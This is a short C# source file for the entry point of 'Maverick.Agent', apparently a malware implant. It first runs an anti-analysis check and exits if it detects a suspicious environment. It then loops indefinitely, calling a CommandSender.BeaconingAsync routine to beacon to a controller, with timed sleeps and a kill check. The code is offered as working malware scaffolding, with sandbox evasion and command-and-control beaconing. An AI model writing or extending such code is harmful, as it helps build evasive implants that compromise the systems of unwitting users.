using System;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            if (AntiAnalysisVietNam.IsSuspiciousEnvironment())
            {
                return;
            }
            int parameterHome = 0;
            if (args.Length != 0 && !int.TryParse(args[0], out parameterHome))
            {
                return;
            }
            try
            {
                if(AntiAnalysisVietNam.IsSuspiciousEnvironment())
                {
                    return;
                }
                //
            }
            catch (Exception)
            {
            }
            int num = 0;
            while(Program.isConnected)
            {
                Thread.Sleep(2000);
                num++;
                if (num >= 30)
                {
                    if (!AntiAnalysisVietNam.ShouldContinueExecution())
                    {
                        isConnected = false;
                    }
                    System.Threading.Thread.Sleep(10000); //nghi ngoi
                    num = 0;
                }
                //_ = Task.Run(async () =>
                //{
                //    await CommandSender.BeaconingAsync();
                //});

                CommandSender.BeaconingAsync().Wait();

            }

        }
        
        private static bool isConnected = true;
    }
}
